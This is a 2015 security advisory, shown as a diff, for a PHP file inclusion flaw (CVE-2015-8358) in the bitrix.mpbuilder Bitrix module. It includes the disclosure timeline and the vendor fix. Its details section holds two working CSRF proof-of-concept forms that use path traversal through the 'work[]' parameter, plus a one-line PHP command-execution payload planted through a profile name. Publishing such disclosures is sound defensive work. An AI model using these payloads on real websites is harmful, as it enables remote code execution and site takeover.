@@ -1,0 +1,66 @@
+Advisory ID: HTB23281
+Product: bitrix.mpbuilder Bitrix module
+Vendor: www.1c-bitrix.ru
+Vulnerable Version(s): 1.0.10 and probably prior
+Tested Version: 1.0.10
+Advisory Publication:  November 18, 2015  [without technical details]
+Vendor Notification: November 18, 2015 
+Vendor Patch: November 25, 2015 
+Public Disclosure: December 9, 2015 
+Vulnerability Type: PHP File Inclusion [CWE-98]
+CVE Reference: CVE-2015-8358
+Risk Level: Critical 
+CVSSv3 Base Score: 9.6 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H]
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered vulnerability in bitrix.mpbuilder Bitrix module, which can be exploited to include and execute arbitrary PHP file on the target system with privileges of the web server. The attacker will be able to execute arbitrary system commands and gain complete control over the website.
+
+Access to vulnerable modules requires administrative privileges, however the vulnerability can be used by anonymous users via CSRF vector.
+ 
+The vulnerability exists due to insufficient filtration of "work[]" HTTP POST parameter in "/bitrix/admin/bitrix.mpbuilder_step2.php" script before using it in the include() PHP function. A remote attacker can include and execute arbitrary local file on the target system.
+
+A simple exploit below will include and execute "/tmp/file" file:
+
+<form action="http://[host]/bitrix/admin/bitrix.mpbuilder_step2.php?module_id=blog" method="post" name="main">
+<input type="hidden" name="save" value="1">
+<input type="hidden" name="work[/../../../../../../../../../../../../../../../../../../tmp/file]" value="1">
+<input value="submit" id="btn" type="submit" />
+</form>
+
+
+In a real-world scenario an attacker can use session files to execute arbitrary PHP code. For example, an attacker can change name in his profile to <? exec($_POST['cmd']); ?> and create a CSRF exploit that will pass arbitrary commands and execute them on the system. The PoC code below executes /bin/ls command using previously created session file with malicious "NAME" value:
+
+
+<form action="http://[host]/bitrix/admin/bitrix.mpbuilder_step2.php?module_id=blog" method="post" name="main">
+<input type="hidden" name="save" value="1">
+<input type="hidden" name="work[/../../../../../../../../../../../../../../../../../../tmp/sess_[SESSION_ID]]" value="1">
+<input type="hidden" name="cmd" value="ls">
+<input value="submit" id="btn" type="submit" />
+</form>
+
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to bitrix.mpbuilder module 1.0.12
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23281 - https://www.htbridge.com/advisory/HTB23281 - PHP File Inclusion in bitrix.mpbuilder Bitrix module
+[2] bitrix.mpbuilder - https://marketplace.1c-bitrix.ru/solutions/bitrix.mpbuilder/ - Bitrix module for software developers. 
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
